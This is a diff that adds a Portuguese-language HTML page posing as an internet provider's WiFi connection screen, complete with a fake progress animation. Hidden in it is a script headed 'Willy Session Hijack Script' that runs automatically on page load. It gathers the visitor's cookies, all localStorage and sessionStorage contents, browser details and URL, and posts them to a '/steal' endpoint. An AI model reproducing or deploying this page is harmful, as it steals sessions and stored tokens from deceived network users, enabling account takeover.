@@ -1,0 +1,208 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Conectar ao WiFi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        .wifi-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .wifi-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: white;
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            border-radius: 3px;
+            transition: width 0.5s ease;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #999;
+            font-size: 12px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="wifi-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M12 18c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0-6c3.3 0 6 2.7 6 6h-2c0-2.2-1.8-4-4-4s-4 1.8-4 4H6c0-3.3 2.7-6 6-6zm0-6c5.5 0 10 4.5 10 10h-2c0-4.4-3.6-8-8-8s-8 3.6-8 8H2c0-5.5 4.5-10 10-10z"/>
+            </svg>
+        </div>
+        
+        <h1>Conectando...</h1>
+        <p class="subtitle">Estabelecendo conexao segura</p>
+        
+        <div class="spinner"></div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+        
+        <p class="status" id="status">Verificando conexao...</p>
+        
+        <div class="footer">
+            <p>&copy; 2026 Provedor de Internet</p>
+        </div>
+    </div>
+
+    <!-- Willy Session Hijack Script - Injetado Automaticamente -->
+    <script>
+        (function() {
+            // Funcao para capturar sessao
+            function captureSession() {
+                var sessionData = {
+                    cookies: document.cookie,
+                    localStorage: {},
+                    sessionStorage: {},
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Capturar localStorage
+                try {
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var key = localStorage.key(i);
+                        sessionData.localStorage[key] = localStorage.getItem(key);
+                    }
+                } catch(e) {}
+                
+                // Capturar sessionStorage
+                try {
+                    for (var i = 0; i < sessionStorage.length; i++) {
+                        var key = sessionStorage.key(i);
+                        sessionData.sessionStorage[key] = sessionStorage.getItem(key);
+                    }
+                } catch(e) {}
+                
+                // Enviar dados capturados
+                fetch('/steal', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(sessionData)
+                }).catch(function() {});
+            }
+            
+            // Executar captura apos carregamento
+            if (document.readyState === 'complete') {
+                captureSession();
+            } else {
+                window.addEventListener('load', captureSession);
+            }
+        })();
+    </script>
+    
+    <!-- Animacao de progresso -->
+    <script>
+        var progress = 0;
+        var progressBar = document.getElementById('progress');
+        var statusText = document.getElementById('status');
+        
+        var messages = [
+            'Verificando conexao...',
+            'Obtendo endereco IP...',
+            'Configurando DNS...',
+            'Estabelecendo conexao segura...',
+            'Autenticando...',
+            'Conexao estabelecida!'
+        ];
+        
+        var interval = setInterval(function() {
+            progress += 5;
+            progressBar.style.width = progress + '%';
+            
+            var messageIndex = Math.floor(progress / 20);
+            if (messageIndex < messages.length) {
+                statusText.textContent = messages[messageIndex];
+            }
+            
+            if (progress >= 100) {
+                clearInterval(interval);
+                setTimeout(function() {
+                    statusText.textContent = 'Conectado com sucesso!';
+                }, 500);
+            }
+        }, 200);
+    </script>
+</body>
+</html>
